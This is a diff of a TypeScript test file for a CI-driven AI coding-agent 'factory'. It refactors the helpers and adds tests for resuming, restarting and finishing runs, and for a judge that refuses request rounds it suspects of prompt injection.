   expect(w.jevAsked).toBe(1); // only Jev 2: triage did not run again
   expect(w.claudeRuns[0].resume).toBeUndefined();
@@ -1608,8 +1620,8 @@ test("questions off stops before the questions agent, and its resume asks the qu
   expect(first.workItemComments.at(-1)).toMatch(/^Reason: switch off questions$/m);
   switches.questions = true;
   expect(await resumeSwitchedOff(first.ctx)).toEqual(["8"]);
-  const w = resumeWorld({ jev1: { clarity: 4 }, state: "stopped" }, first);
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { clarity: 4 }, state: "stopped" }, first);
+  await drain(w, "build");
   expect(w.jevAsked).toBe(0);
   expect(w.claudeRuns).toHaveLength(1);
   expect(w.claudeRuns[0].resume).toBeUndefined();
@@ -1667,7 +1679,7 @@ test("apply off does not stop a finish run after a hand merge", async () => {
   expect(w.record.steps.some((s) => s.step === "verify")).toBe(true);
   expect(w.states).toEqual(["done"]);
 });
-test("a resumed apply sends label_change factory_running to the stopped run, and a failed start leaves the ticket stopped", async () => {
+test("a resumed apply sends label_change running to the stopped run, and a failed start leaves the ticket stopped", async () => {
   const w = fakeWorld();
   const switches = withSwitches(w, "apply");
   w.ci.vars = { ...w.ci.vars, buildRun: "41", run: "2" };
@@ -1680,17 +1692,11 @@ test("a resumed apply sends label_change factory_running to the stopped run, and
   expect(w.states).toEqual(["stopped"]);
   w.ci.start = start;
   expect(await resumeSwitchedOff(w.ctx)).toEqual(["8"]);
-  w.ci.buildRecord = async () => record;
+  w.ci.save("41", record);
   await runStep("apply", apply.run, { dir: tmp(), make: () => w.ctx });
   expect(w.merged).toBe(true);
-  expect(dash(w).events.filter((e) => e.type === "label_change").map((e) => [e.run, e.data])).toEqual([["run-41", { to: "factory_running" }]]);
+  expect(dash(w).events.filter((e) => e.type === "label_change").map((e) => [e.run, e.data])).toEqual([["run-41", { to: "running" }]]);
 });
-test("parseStoppedNote reads back the note stopped() writes", () => {
-  const body = stoppedNote({ run: "2", step: "apply", reason: "switch off apply", change: "5", buildRun: "41" });
-  expect(parseStoppedNote(body)).toEqual({ run: "2", step: "apply", reason: "switch off apply", change: "5", buildRun: "41" });
-  expect(parseStoppedNote("hello")).toBeUndefined();
-});
-
 // Task B6: resume and restart from the dashboard, and the open item of B4.
 const restartRequest = (run: string, o: Partial<ControlRequest> = {}): ControlRequest => ({ id: "q1", kind: "restart", run, target: "react_frontend", ticket: "8", user: "ana", at: new Date().toISOString(), ...o });
 test("a restart ends the old run as blocked, sets ready, and that build's event step starts a new run for the request's user", async () => {
@@ -1714,8 +1720,7 @@ test("a restart ends the old run as blocked, sets ready, and that build's event 
   // The new build: no payload, and the factory set the ticket ready.
   request.outcome = "done";
   w.tracker.startedBy = async () => BOT;
-  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8" };
-  await runStep("event", event.run, { dir: tmp(), make: () => w.ctx });
+  await drain(w, "build");
   expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true, actor: "ana" } });
   expect(w.record.runId).toMatch(/^[0-9a-f-]{36}$/);
   expect(w.record.runId).not.toBe(oldRun);
@@ -1760,10 +1765,9 @@ test("@factory resume or a dashboard resume of a run the apply switch stopped st
 });
 // R30: after a cancel, the newest factory note is the cancel, so an older stop is not resumed.
 test("@factory resume after a cancel from the dashboard starts nothing", async () => {
-  const w = fakeWorld({ state: "stopped", payload: command("resume") });
+  const w = fakeWorld({ state: "stopped", payload: command("resume"), runs: (await stopRecord()).ci.runs });
   await w.tracker.comment("8", "Stopped run: pipeline 1");
-  await w.tracker.comment("8", cancelNote("dev"));
-  w.ci.buildRecord = async () => (await stopRecord()).record;
+  await w.tracker.comment("8", noteText({ kind: "cancelled", user: "dev" }));
   await runBuildJobs(w, tmp());
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "cancelled" } });
   expect(w.restored).toEqual([]);
@@ -1792,8 +1796,8 @@ test("the questions writer holds writer.md from the base branch", async () => {
 });
 test("a resumed author session gets no section again", async () => {
   const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit", baseFiles: { ".factory/author.md": "BASE RULE" } }));
-  const w = resumeWorld({ jev1: { risk: "trivial" }, baseFiles: { ".factory/author.md": "BASE RULE" } }, { record: first.record });
-  await runBuildJobs(w, tmp());
+  const w = await resumeWorld({ jev1: { risk: "trivial" }, baseFiles: { ".factory/author.md": "BASE RULE" } }, first);
+  await drain(w, "build");
   const resumed = w.harness.jobs.find((j) => j.role === "author" && j.resume)!;
   expect(resumed.prompt).not.toContain("BASE RULE");
 });
@@ -1935,16 +1939,15 @@ test("the factory's own close never ends a run: result-saved ends done, and a me
 test("a new run after a dashboard restart closed the old change is not blocked", async () => {
   const w = fakeWorld({ jev1: { risk: "trivial" }, state: "stopped" });
   w.openChange();
-  await w.tracker.comment("8", stoppedNote({ run: "1", step: "apply", reason: "switch off apply", change: "5", buildRun: "1" }));
+  await w.tracker.comment("8", noteText({ kind: "stopped", run: "1", step: "apply", reason: "switch off apply", change: "5", buildRun: "1" }));
   const request = restartRequest("run-1");
   w.ctx.dashboard = fakeDashboard({ requests: [request] });
   await handleRequests(w.ctx);
   expect(w.host.changes.get("5")!.open).toBe(false); // closeStoppedChange
   request.outcome = "done";
   w.tracker.startedBy = async () => BOT;
-  w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8" };
   pollingAuthor(w);
-  await runBuildPipeline(w);
+  await drain(w, "build");
   expect(w.states).not.toContain("blocked");
   expect(w.finishTriggered).toBe(true);
 });
@@ -2018,10 +2021,10 @@ async function requestWorld(o: WorldOptions = {}, risk: "medium" | "trivial" = "
   expect(first.states).toEqual([risk === "medium" ? "needs_approval" : "running"]);
   const w = fakeWorld({ state: "needs_approval", ...o });
   w.ci.vars = { ...w.ci.vars, payload: undefined, ticket: "8", buildRun: "41", change: "5" };
-  w.ci.buildRecord = async () => first.record;
+  w.ci.save("41", first.record);
   w.openChange();
   w.tracker.tickets.get("8")!.marks = ["triaged", "implemented", "reviewed", "checked", "risk_checked"];
-  w.host.sayOnChange("5", BOT, cursorLine(T0), T0, true);
+  w.host.sayOnChange("5", BOT, noteText({ kind: "cursor", text: "The factory waits.", at: T0 }), T0, true);
   w.host.sayOnChange("5", "dev", "@factory add a screenshot", T1);
   w.tracker.say("8", "dev", "@factory and rename the prop", T2);
   return { first, w };
@@ -2032,7 +2035,7 @@ test("a request round restores the run, tells the work item, clears the marks an
   const dir = tmp();
   await eventJob(w, dir);
   expect(w.restored).toEqual(["41"]);
-  expect(w.workItemComments).toEqual([`The factory started another round for the requests of @dev.\n\n${cursorLine(T2)}`]);
+  expect(w.workItemComments).toEqual([noteText({ kind: "cursor", text: `The factory started another round for the requests of @dev.`, at: T2 })]);
   expect(w.tracker.tickets.get("8")!.marks).toEqual(["triaged"]);
   expect(w.states).toEqual(["running"]);
   expect(w.record.rounds).toEqual({ review: 0, gate: 0 });
@@ -2078,7 +2081,7 @@ test("a round resumes the saved session with the request prompt, the wrapped req
 test("a round with no saved session still uses the saved commands, not the work tree's", async () => {
   const { first, w } = await requestWorld({ factoryFile: "install: changed\nlint: x\ntest: x\nbuild: x\n" });
   const steps = first.record.steps.map((s) => (s.data && typeof s.data === "object" && "sessionId" in s.data ? { ...s, data: { ...s.data, sessionId: undefined } } : s));
-  w.ci.buildRecord = async () => ({ ...first.record, steps } as typeof first.record);
+  w.ci.save("41", { ...first.record, steps } as typeof first.record);
   const dir = tmp();
   await eventJob(w, dir);
   await runStep("prepare-patch", preparePatchStep.run, { dir, make: () => w.ctx });
@@ -2104,9 +2107,9 @@ test("a round that hits the usage limit is resumed with CONTINUE, not the reques
   const retry = fakeWorld({ state: "waiting" });
   const run = retry.harness.run;
   retry.harness.run = async (job) => ({ ...(await run(job)), ...(job.role === "author" && { text: "- @dev: added the screenshot" }) });
-  retry.ci.vars = { ...retry.ci.vars, payload: undefined, ticket: "8", buildRun: "42" };
-  retry.ci.buildRecord = async () => w.record;
-  await runBuildJobs(retry, tmp());
+  retry.ci.save("42", w.record);
+  await retry.ci.start({ kind: "build", ticket: "8", buildRun: "42" });
+  await drain(retry, "build");
   expect(retry.claudeRuns[0]).toMatchObject({ resume: "sess-limit", prompt: CONTINUE });
   expect(runFacts(first.record).roundStart).toBe(false);
   expect(retry.record.requestRounds!.at(-1)!.answer).toBe("- @dev: added the screenshot"); // the CONTINUE run's answer is the round's answer
@@ -2132,13 +2135,13 @@ test("a request event on a stopped work item posts the reply with the cursor lin
   const w = await hearRequest("stopped", requestEvent());
   expect(w.ci.started).toEqual([]);
   expect(w.workItemComments).toHaveLength(1);
-  expect(w.workItemComments[0]).toContain(cursorLine(T2));
+  expect(cursorOf(w.workItemComments[0])).toBe(T2);
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "replied" } });
 });
 test("a request event on a blocked work item sets it ready for the person", async () => {
   const w = await hearRequest("blocked", requestEvent());
   expect(w.states).toEqual(["ready"]);
-  expect(w.workItemComments[0]).toContain(readyForLine("dev"));
+  expect(noteIn(w.workItemComments[0], "readyFor")).toMatchObject({ person: "dev" });
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "started" } });
 });
 test("a request event from the factory, an untrusted person, or for another change does nothing", async () => {
@@ -2156,7 +2159,7 @@ test("a request event from the factory, an untrusted person, or for another chan
 test("a request round stops quietly when the ticket no longer waits, there is no new request, or the change is closed", async () => {
   const cases: [string, (w: ReturnType<typeof fakeWorld>) => void][] = [
     ["state", (w) => void (w.tracker.tickets.get("8")!.state = "running")],
-    ["request", (w) => w.host.sayOnChange("5", BOT, cursorLine(T2), "2026-10-01T13:00:00Z", true)],
+    ["request", (w) => w.host.sayOnChange("5", BOT, noteText({ kind: "cursor", text: "The factory waits.", at: T2 }), "2026-10-01T13:00:00Z", true)],
     ["change", (w) => w.host.close("5")],
   ];
   for (const [, change] of cases) {
@@ -2178,7 +2181,8 @@ test.each(["waiting", "stopped"] as const)("a round build for a ticket in factor
   expect([w.states, w.restored, w.workItemComments, w.mrComments]).toEqual([[state], [], [], []]);
 });
 test("a round build whose build run is no longer the change's stops quietly as stale-build", async () => {
-  const { w } = await requestWorld();
+  const { first, w } = await requestWorld();
+  w.ci.save("40", first.record); // an older run that is still on record, but is not the change's
   w.ci.vars = { ...w.ci.vars, buildRun: "40" };
   await eventJob(w);
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "stale-build" } });
@@ -2187,14 +2191,14 @@ test("a round build whose build run is no longer the change's stops quietly as s
 test.each([["a judge that suspects injection", { injectionYes: 0.9 }], ["a judge that answers NaN", { injectionYes: NaN }]])("%s refuses the whole round and moves the cursor", async (_n, jev1) => {
   const { w } = await requestWorld({ jev1 });
   await eventJob(w);
-  expect(w.workItemComments).toEqual([`@dev The factory did not act on this request: the judge found it may try to give an AI agent orders. A person must read it. The change still waits for a person.\n\n${cursorLine(T2)}`]);
+  expect(w.workItemComments).toEqual([noteText({ kind: "cursor", text: `@dev The factory did not act on this request: the judge found it may try to give an AI agent orders. A person must read it. The change still waits for a person.`, at: T2 })]);
   expect(w.states).toEqual(["needs_approval"]);
   expect(w.restored).toEqual([]);
   expect(w.tracker.tickets.get("8")!.marks).toContain("implemented");
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "injection" } });
   expect(w.record.requestRounds).toBeUndefined();
   // Nothing is left to answer: the poller starts no round again.
-  expect((await newRequests(w.ctx, "8")).requests).toEqual([]);
+  expect((await conversation(w.ctx).requests("8")).requests).toEqual([]);
 });
 test("a judge that throws refuses nothing, writes no cursor and leaves the ticket waiting for the next poll", async () => {
   const { w } = await requestWorld({ jev1: "throw" });
@@ -2208,12 +2212,11 @@ test("a judge that throws refuses nothing, writes no cursor and leaves the ticke
   expect(w.workItemComments).toEqual([]);
   expect(w.states).toEqual(["needs_approval"]);
   expect(w.restored).toEqual([]);
-  expect((await newRequests(w.ctx, "8")).requests).toHaveLength(2);
+  expect((await conversation(w.ctx).requests("8")).requests).toHaveLength(2);
 });
 test("a request round of another ticket's record (cannotContinue) blocks instead of starting", async () => {
   const { w } = await requestWorld();
-  const record = await w.ci.buildRecord("41");
-  w.ci.buildRecord = async () => ({ ...record, workItem: "other/project#9" });
+  w.ci.save("41", { ...(await w.ci.buildRecord("41")), workItem: "other/project#9" });
   await eventJob(w).catch(() => {});
   expect(w.states).toEqual(["blocked"]);
   expect(w.restored).toEqual([]);
@@ -2221,13 +2224,13 @@ test("a request round of another ticket's record (cannotContinue) blocks instead
 test("a request round whose open change is not the record's change replies, keeps the change waiting and moves the cursor", async () => {
   const { first, w } = await requestWorld();
   const steps = first.record.steps.map((s) => (s.step === "precommit-gate" ? { ...s, data: { ...(s.data as object), change: "99" } } : s));
-  w.ci.buildRecord = async () => ({ ...first.record, steps });
+  w.ci.save("41", { ...first.record, steps });
   await eventJob(w);
-  expect(w.workItemComments).toEqual([`@dev The factory could not start a round: the open change 5 is not the change of pipeline 41. The change still waits for a person.\n\n${cursorLine(T2)}`]);
+  expect(w.workItemComments).toEqual([noteText({ kind: "cursor", text: `@dev The factory could not start a round: the open change 5 is not the change of pipeline 41. The change still waits for a person.`, at: T2 })]);
   expect(w.states).toEqual(["needs_approval"]);
   expect(w.restored).toEqual([]);
   expect(w.record.steps.at(-1)).toMatchObject({ step: "event", data: { start: false, reason: "change-mismatch" } });
-  expect((await newRequests(w.ctx, "8")).requests).toEqual([]);
+  expect((await conversation(w.ctx).requests("8")).requests).toEqual([]);
 });
 
 // The end of a round (Task 8): a ticket that would merge alone still goes back to the person who asked.
@@ -2262,7 +2265,7 @@ test("the round comment comes before the needs-a-person comment, which ends with
   const { w } = await finishedRound("x".repeat(5000));
   const [round, ask] = w.mrComments.slice(-2);
   expect(round).toBe(`The factory finished the round for the requests of @dev @lead.\n\n${"x".repeat(4000)}`);
-  expect(ask).toBe(`This change needs a person to review and merge it:\n\n- ${decision.ASKED}\n\n${cursorLine(T3)}`);
+  expect(ask).toBe(noteText({ kind: "cursor", text: `This change needs a person to review and merge it:\n\n- ${decision.ASKED}`, at: T3 }));
   expect(w.host.assigned.at(-1)).toEqual({ ref: "5", person: "lead" }); // not the work item's assignee "owner"
 });
 test("the round closes with its own review rounds, gate rounds, cost and tokens", async () => {
@@ -2280,7 +2283,7 @@ test("the cursor line is the time the agent read up to, when that is later than 
   const at = "2026-10-01T14:00:00Z";
   w.ctx.record = { ...w.record, heardUntil: at, requestRounds: w.record.requestRounds!.map((r) => ({ ...r, endedAt: undefined })) }; // the round is open again
   await decision.askPerson(w.ctx, ["x"]);
-  expect(w.mrComments.at(-1)).toBe(`This change needs a person to review and merge it:\n\n- x\n\n${cursorLine(at)}`);
+  expect(w.mrComments.at(-1)).toBe(noteText({ kind: "cursor", text: `This change needs a person to review and merge it:\n\n- x`, at: at }));
 });
 test("a later resume of the requested run still goes to a person", async () => {
   const { w } = await finishedRound();
@@ -2294,5 +2297,69 @@ test("a later resume of the requested run still goes to a person", async () => {
 test("a first run with no round writes the cursor line too", async () => {
   const w = await runBuildPipeline(fakeWorld({ jev1: { risk: "medium" } }));
   expect(w.mrComments.at(-1)).toMatch(/\n\nRequests read up to: \S+$/);
-  expect(w.mrComments.at(-1)!.endsWith(`\n\n${cursorLine(runFacts(w.record).eventAt!)}`)).toBe(true);
+  expect(w.mrComments.at(-1)!.endsWith(noteText({ kind: "cursor", text: ``, at: runFacts(w.record).eventAt! }))).toBe(true);
+});
+
+// Whole runs through the fake CI: a pipeline that start() queued runs through the real step runner (drain), and
+// loads the record the pipeline before it saved. Nothing is stubbed: not the record, not the pipeline's variables.
+const runEnded = (w: ReturnType<typeof fakeWorld>) => [w.states, w.merged, w.closed];
+test("a run stopped during the build resumes from the dashboard with its saved session and merges", async () => {
+  const w = fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" });
+  const requests: ControlRequest[] = [];
+  w.ctx.dashboard = fakeDashboard({ requests });
+  await runBuildJobs(w, tmp());
+  expect(w.states).toEqual(["stopped"]);
+  const runId = w.record.runId;
+  requests.push({ ...restartRequest("run-1"), kind: "resume" });
+  expect(await handleRequests(w.ctx)).toEqual(["8"]);
+  expect(w.ci.queue).toEqual([{ kind: "build", ticket: "8", buildRun: "1", run: "2" }]);
+  await drain(w);
+  expect(w.restored).toEqual(["1"]);
+  expect(w.harness.jobs.find((j) => j.role === "author" && j.resume)).toMatchObject({ resume: "sess-stop" });
+  expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1); // the resumed pipeline did not triage again
+  expect(w.record.runId).toBe(runId);
+  expect(runEnded(w)).toEqual([["done"], true, true]);
+  expect(w.ci.queue).toEqual([]);
+});
+test("a stopped run restarts from the dashboard: the old run ends as restarted and a new run merges", async () => {
+  const w = fakeWorld({ jev1: { risk: "trivial" }, prepare: "stop" });
+  const requests: ControlRequest[] = [];
+  w.ctx.dashboard = fakeDashboard({ requests });
+  await runBuildJobs(w, tmp());
+  const oldRun = w.record.runId!;
+  requests.push(restartRequest(oldRun));
+  expect(await handleRequests(w.ctx)).toEqual(["8"]);
+  w.tracker.startedBy = async () => BOT; // the factory set the ready for the person who asked
+  await drain(w);
+  expect(dash(w).events.filter((e) => e.type === "run_end").map((e) => [e.run, e.data])).toEqual([[oldRun, { outcome: "restarted" }], [w.record.runId, { outcome: "done" }]]);
+  expect(w.record.runId).not.toBe(oldRun);
+  expect(w.record.steps[0]).toMatchObject({ step: "event", data: { start: true, actor: "ana" } });
+  expect(w.restored).toEqual([]); // a new run, not a resume
+  expect(w.harness.jobs.some((j) => j.resume)).toBe(false);
+  expect(runEnded(w)).toEqual([["done"], true, true]);
+});
+test("a run waiting at the author's usage limit resumes in the hourly retry with its saved session and merges", async () => {
+  const w = fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" });
+  await runBuildJobs(w, tmp());
+  expect(w.states).toEqual(["waiting"]);
+  expect(w.ci.queue).toEqual([]);
+  expect(await retryWaiting(w.ctx)).toEqual(["8"]);
+  expect(w.ci.queue).toEqual([{ kind: "build", ticket: "8", buildRun: "1", run: "2" }]);
+  await drain(w);
+  expect(w.restored).toEqual(["1"]);
+  expect(w.harness.jobs.find((j) => j.role === "author" && j.resume)).toMatchObject({ resume: "sess-limit" });
+  expect(w.record.steps.filter((s) => s.step === "triage")).toHaveLength(1);
+  expect(runEnded(w)).toEqual([["done"], true, true]);
+});
+test("the finish pipeline loads the record its build pipeline saved, and a record of no run is refused", async () => {
+  const w = fakeWorld({ jev1: { risk: "trivial" } });
+  await runBuildJobs(w, tmp());
+  expect(w.ci.queue).toEqual([{ kind: "finish", ticket: "8", change: "5", buildRun: "1", run: "2" }]);
+  await drain(w);
+  expect(w.record.steps.map((s) => s.step).slice(-4)).toEqual(["decision", "apply", "verify", "result-saved"]);
+  expect(w.record.steps.filter((s) => s.step === "event")).toHaveLength(1);
+  expect(runEnded(w)).toEqual([["done"], true, true]);
+  expect([...w.ci.runs.keys()]).toEqual(["1"]); // the build run is on record, its finish run (2) is not: the real CIs refuse both a finish run and a crashed one
+  await w.ci.start({ kind: "finish", ticket: "8", change: "5", buildRun: "41" }); // nothing saved a run 41
+  await expect(drain(w)).rejects.toThrow(/Run 41 is not a factory build run/);
 });
